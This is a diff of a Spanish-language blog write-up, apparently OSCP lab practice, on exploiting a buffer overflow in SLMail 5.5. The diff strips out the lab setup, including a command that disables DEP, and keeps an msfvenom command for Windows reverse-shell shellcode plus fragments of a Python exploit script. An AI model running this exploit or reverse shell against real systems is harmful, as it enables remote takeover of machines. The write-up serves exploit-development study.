@@ -1,93 +1,3 @@
-## Firewall de Windows y reglas de Entrada/Salida - Configuracion Parte 1
-
-Lo primero es configurar una maquina Windows para montar el entorno de practica, y es importante que este bien configurado para tener comunicacion entre maquinas `(La maquina Windows con el binario vulnerable, y nuestra maquina de atacante).`
-
-> *Se usara un sistema Windows 7 de 32 bits, la version starter.*
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/W7.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-> 
-
-Despues de instalar la maquina Windows, es muy importante que haya comunicacion entre las 2 maquinas mediante trazas **ICMP**, debido a que por defecto estas reglas vienen deshabilitadas, por tanto, para lograr esta configuracion debemos ir a la configuracion avanzada de firewall de Windows y habilitar las reglas de Entrada/Salida para tener la comunicacion por iPv4 y por iPv6:
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/ReglasEntrada.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-> En la imagen se muestran las reglas de entrada donde hay que habilitar las 4 reglas para poder recibir una comunicacion de nuestra maquina de atacante, de esta forma habra una comunicacion, por tanto hay que repetir el proceso para las reglas de salida:
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/ReglasSalida.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-> 
-
-Una vez con las reglas habilitadas probamos la comunicacion:
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/PruebaPing.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-> 
-
-Al enviar 4 paquetes y recibirlos confirma que hay comunicacion entre maquinas completando el primer paso para dar inicio a la practica del BufferOverflow.
-
-## Desactivar el DEP - Configuracion Parte 2
-
-Esta parte es importante, debemos abrir un simbolo del sistema como administrador y ejecutar el siguiente comando:
-
-```cmd
-bcdedit.exe /set {current} nx AlwaysOff
-```
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/DEP.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
->
-Estamos desactivando el *DEP* `(Data Execution Protection)`, pero para todo el sistema, tambien se puede hacer para el binario Slmail concretamente desde el apartado GUI, pero al ser una maquina virtual que su unico proposito es la practica de BufferOverflow y despues sera eliminada. La verdad es que no supone ningun problema este comando.
-
-> *Debemos reiniciar el sistema para que se apliquen los cambios* 
-
-
-## Utilidades - Configuracion Parte 3
-
-Para las utilidades se descargaran unas aplicaciones para hacer el trabajo mas comodo, por tanto, se descargara el binario al cual vamos a atacar *(Slmail_5.5 ya que es vulnerable a BOF)* la aplicacion Inmunity Debugger para monitorizar todo a bajo nivel.
-
-> Una vez instalado El binario Slmail debemos reiniciar nuestro sistema
-
-Nos vamos a sistema y seguridad, sistema, configuracion avanzada del sistema, configuracion y prevencion de ejecucion de datos. Aqui vemos que el DEP este deshabilitado.
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/DEPvalidacion.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-El binario slmail trabaja en el puerto 25 y el 110 que corren esta utilidad.
-
-Para ver la comunicacion hay que crear una nueva regla, donde a nivel de protocolo tcp hay que especificar los puertos 25, 110 y permitir la comunicacion
-
-Se procede a isntalar la utilidad `mona.py` para trabajar con inmunity debuuger.
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/mona.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-> A continuacion la vista del script mona desde el inmunity debugger
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/mona2.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
-## Enumeracion
-
-Mediante `nmap -sS --min-rate 5000 --open -vvv -n -Pn` obtendremos los resultados del escaneo
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/nmap.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
 
 ## Badchars
 
@@ -136,21 +46,10 @@ nuestro codigo y proporcionarnos nuestra reverse shell, o el comando que queramo
 
 ## Codigo del Script
 
-Bof a Slmail 5.5
-
 Para conseguir el shellcode se puede hacer uso de la herramienta msfvenom:
 
 > msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=443 -a x86 --platform windows -b '\x00\x0a\x0d' -e x86/shikata_ga_nai -f c
-
-
-> El script esta hecho en python3
-
-<div style="text-align: center;">
-  <img src="/assets/images/BOF-SLMail/script.png" alt="bof" width="2000" oncontextmenu="return false;">
-</div>
-
->
-
+> 
 ```python
 #!/usr/bin/python
 # Autor liandd
@@ -188,11 +87,3 @@ if __name__ == '__main__':
 
     exploit(ip_address, rport)
 ```
-
-El Script es compilado y funciona correctamente
-
----
-
-Esta publicacion ha sido creada como soporte en el aprendizaje de BufferOverFlow para la OSCP
-
-Lian
